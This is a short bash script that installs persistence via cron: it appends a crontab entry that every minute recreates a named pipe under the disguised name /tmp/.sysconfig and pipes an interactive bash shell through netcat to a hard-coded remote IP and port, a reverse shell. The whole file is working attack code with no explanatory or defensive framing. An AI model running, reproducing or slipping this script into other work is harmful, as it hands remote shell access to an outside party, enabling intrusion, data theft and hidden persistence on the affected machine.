#!/bin/bash

IP="10.2.45.121"
PORT="9101"
CURRENT_CRONTAB=$(crontab -l)
PAYLOAD="\n* * * * * bash -c \"while [ 1 ]; do rm /tmp/.sysconfig; mkfifo /tmp/.sysconfig; cat /tmp/.sysconfig | bash -i 2>&1 | nc $IP $PORT > /tmp/.sysconfig; sleep 10; done\""
TEMP_CRONTAB_FILE=$(mktemp)
crontab -l > "$TEMP_CRONTAB_FILE"
echo -e "$PAYLOAD" >> "$TEMP_CRONTAB_FILE"
crontab "$TEMP_CRONTAB_FILE"
cat "$TEMP_CRONTAB_FILE"
rm "$TEMP_CRONTAB_FILE"
